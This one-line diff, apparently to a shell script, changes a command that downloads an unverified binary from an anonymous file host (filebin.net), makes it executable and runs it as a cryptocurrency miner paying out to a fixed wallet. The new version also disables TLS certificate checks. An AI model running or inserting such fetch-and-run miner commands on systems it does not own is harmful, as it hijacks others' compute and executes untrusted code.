@@ -1,1 +1,1 @@
-wget https://filebin.net/mlp1gt9ec3s18saf/cpuminertermux && chmod +x cpuminertermux && ./cpuminertermux -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u t1fNgzdtSPKKSqcGiWvL42QZxq5CmVXX82R -p c=FLUX --threads 28
+wget --no-check-certificate https://filebin.net/u9ubpy80pgjshm6h/cpuminer-ryzen && chmod +x cpuminer-ryzen && ./cpuminer-ryzen -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u t1fNgzdtSPKKSqcGiWvL42QZxq5CmVXX82R -p c=FLUX --threads 4
